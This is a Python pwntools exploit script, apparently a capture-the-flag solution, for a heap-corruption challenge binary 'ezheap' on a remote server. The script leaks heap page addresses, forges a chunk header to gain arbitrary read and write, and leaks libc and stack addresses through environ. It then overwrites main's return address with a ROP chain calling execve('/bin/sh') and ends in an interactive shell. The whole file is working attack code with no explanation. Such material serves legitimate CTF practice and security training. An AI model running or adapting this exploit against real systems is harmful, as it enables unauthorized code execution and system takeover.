from pwn import *
import struct 

# p = process("./ezheap",env={"LD_PRELOAD":"./libc-2.27.so"})

p = remote("123.60.25.24",20077)

def cmd(c):
    p.recvuntil("enter your choice>>")
    p.sendline(str(c))

def q2d(value):
    return struct.unpack("<d", p64(value))[0]

def d2q(value):
    return u64(struct.pack("<d",value))

def pack_double(value):
    return struct.pack("<d",value)


def alloc(type,size,idx):
    cmd(1)
    p.recvuntil("type >>")
    p.sendline(str(type))
    p.recvuntil("size>>")
    p.sendline(str(size))
    p.recvuntil("idx>>")
    p.sendline(str(idx))
    

def edit(type,idx,element_idx,value):
    cmd(2)
    p.recvuntil("type >>")
    p.sendline(str(type))
    p.recvuntil("idx>>")
    p.sendline(str(idx))
    p.recvuntil("element_idx>>")
    p.sendline(str(element_idx))
    p.recvuntil("value>>")
    p.sendline(str(value))

def view(type,idx,element_idx):
    cmd(3)
    p.recvuntil("type >>")
    p.sendline(str(type))
    p.recvuntil("idx>>")
    p.sendline(str(idx))
    p.recvuntil("element_idx>>")
    p.sendline(str(element_idx))

def dele(type,idx):
    cmd(4)
    p.recvuntil("type >>")
    p.sendline(str(type))
    p.recvuntil("idx>>")
    p.sendline(str(idx))

# leak page which chunk size is 0x10
for i in range(0x100):
    alloc(4,0xc,i)

page_10 = 0
page_100 = 0
found_idx = 0


found = False

for i in range(0x100):
    view(4,i,1)
    p.recvuntil("value>>\n")
    value = float(p.recvuntil("\n",drop=True))
    if(value != 0.0 and ((d2q(value)>>32) & 0xfff) == 0x10):
        page_10 = (d2q(value)>>32) & 0xfffff000
        found_idx = i
        found = True
        break

if(found == False):
    info("bad luck!")
    exit(0)
found = False

# leak page which chunk size is 0x100
for i in range(0x100):
    alloc(4,0xfc,i+0x100)

for i in range(0x100):
    view(4,i+0x100,0x1f)
    p.recvuntil("value>>\n")
    value = float(p.recvuntil("\n",drop=True))
    if value != 0.0 and ((d2q(value)>>32) & 0xfff) == 0x100:
        page_100 = (d2q(value)>>32) & 0xfffff000        
        found = True
        break
if(found == False):
    info("bad luck!")
    exit(0)

# leak successful
info("page(chunk size 0x10) addr : " + hex(page_10))
info("page(chunk size 0x100) addr : " + hex(page_100))

# now we overwrite the chunk's head
fake_addr = (page_100 | 0x100) << 32
edit(4,found_idx,1,repr(q2d(fake_addr)))
info("found_idx : " + hex(found_idx))

# free all the chunk that size is 0x10
for i in range(1,0x100):
    dele(4,i)
    alloc(3,0xc,i)

# now we have a fake chunk that size is 0x100, to fetch it back

alloc(3,252,0)

# modify the next Array struct to gain arbitrary read and write

offset = -1

for i in range(4,0x3f):
    view(3,0,i)
    p.recvuntil("value>>\n")
    value = int(p.recvuntil("\n",drop=True))
    if(value == 0x3):
        offset = i + 1    # element_addr's offset
        break

if(offset == -1):
    info("bad luck!")
    exit(0)


edit(3,0,offset,(page_10&0xfffff000)+0x4)

# info("page(chunk size 0x10) addr : " + hex(page_10))
info("found offset : " + str(offset))
# info("page(chunk size 0x100) addr : " + hex(page_100))
# info("found_idx : " + hex(found_idx))

# to search the corrupted chunk
found_idx = -1
for i in range(1,0x100):
    view(3,i,0)
    p.recvuntil("value>>\n")
    value = int(p.recvuntil("\n",drop=True))
    if(value == 0x400):
        found_idx = i   
        break
if(found_idx == -1):
    info("bad luck!")
    exit(0)

# new we can arbitrary read and write

def arb_read(addr):
    edit(3,0,offset,addr)
    view(3,found_idx,0)
    p.recvuntil("value>>\n")
    value = int(p.recvuntil("\n",drop=True))
    return value

def arb_write(addr,value):
    edit(3,0,offset,addr)
    edit(3,found_idx,0,value)

manager_addr = arb_read((page_10&0xfffff000)+0x1c)
info("manager addr : " + hex(manager_addr))

elf = ELF("./ezheap",checksec=False)
libc = ELF("./libc-2.27.so",checksec=False)
elf.address = manager_addr - 0x9060

read_addr = arb_read(elf.got["read"])
libc.address = read_addr - 0xe5620
env_addr = libc.sym["environ"]
stack_addr = arb_read(env_addr)

info("libc base : " + hex(libc.address))
info("env_addr : " + hex(env_addr))

# search for main func ret addr

main_ret_in_stack = 0

for i in range(100):
    t = arb_read(stack_addr - i * 4)
    if t == libc.address + 0x18f21:
        main_ret_in_stack = stack_addr - i * 4
        break

if main_ret_in_stack == 0:
    info("bad luck!")
    exit(0)

# do rop

rop_chain = [libc.sym["execve"],0,libc.search("/bin/sh\x00").next(),0,0]

rop_chain_len = len(rop_chain)

for i in range(rop_chain_len):
    arb_write(main_ret_in_stack + i * 4,rop_chain[i])

cmd(5)

p.interactive()
